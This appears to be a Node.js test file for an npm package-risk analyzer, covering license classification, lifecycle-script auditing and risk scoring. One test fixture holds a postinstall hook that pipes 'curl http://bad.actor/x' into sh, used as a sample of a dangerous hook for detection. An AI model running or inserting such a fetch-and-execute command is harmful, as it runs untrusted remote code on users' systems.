import test from 'node:test';
import assert from 'node:assert/strict';
import {
  parsePackageSpec,
  fetchPackageDetails
} from '../src/fetcher.js';
import {
  analyzeLicense,
  auditLifecycleScripts,
  calculateRiskScore,
  formatBytes,
  analyzePackage
} from '../src/analyzer.js';

test('parsePackageSpec correctly splits package names and tags', () => {
  assert.deepEqual(parsePackageSpec('express'), { name: 'express', versionSpec: 'latest' });
  assert.deepEqual(parsePackageSpec('express@4.18.2'), { name: 'express', versionSpec: '4.18.2' });
  assert.deepEqual(parsePackageSpec('@types/node@18'), { name: '@types/node', versionSpec: '18' });
  assert.deepEqual(parsePackageSpec('@babel/core'), { name: '@babel/core', versionSpec: 'latest' });
});

test('formatBytes handles size conversions cleanly', () => {
  assert.equal(formatBytes(0), '0 B');
  assert.equal(formatBytes(512), '512 B');
  assert.equal(formatBytes(1024), '1 KB');
  assert.equal(formatBytes(1572864), '1.5 MB');
});

test('analyzeLicense classifies licenses accurately', () => {
  assert.equal(analyzeLicense('MIT').category, 'PERMISSIVE');
  assert.equal(analyzeLicense('Apache-2.0').category, 'PERMISSIVE');
  assert.equal(analyzeLicense('GPL-3.0').category, 'COPYLEFT');
  assert.equal(analyzeLicense('UNKNOWN').category, 'UNKNOWN');
});

test('auditLifecycleScripts detects dangerous postinstall hooks', () => {
  const safeAudit = auditLifecycleScripts({ build: 'tsc', test: 'vitest' });
  assert.equal(safeAudit.hasDangerousHooks, false);
  assert.equal(safeAudit.hooks.length, 0);

  const dangerousAudit = auditLifecycleScripts({
    postinstall: 'node ./scripts/compile-native.js',
    preinstall: 'sh ./setup.sh'
  });
  assert.equal(dangerousAudit.hasDangerousHooks, true);
  assert.equal(dangerousAudit.hooks.length, 2);
});

test('calculateRiskScore flags risk factors correctly', () => {
  const scriptAudit = { hasDangerousHooks: true, hooks: [{ name: 'postinstall', command: 'curl http://bad.actor/x | sh' }] };
  const licenseAnalysis = { riskLevel: 'HIGH', label: 'UNKNOWN' };
  const rawDetails = {
    deprecated: 'This package is deprecated',
    maintainers: [],
    downloadsWeekly: 100
  };

  const risk = calculateRiskScore(rawDetails, scriptAudit, licenseAnalysis);
  assert.ok(risk.score >= 75, 'Risk score should be CRITICAL/HIGH');
  assert.ok(risk.safetyScore <= 25, 'Safety score should be LOW/CRITICAL');
  assert.equal(risk.level, 'CRITICAL');
});
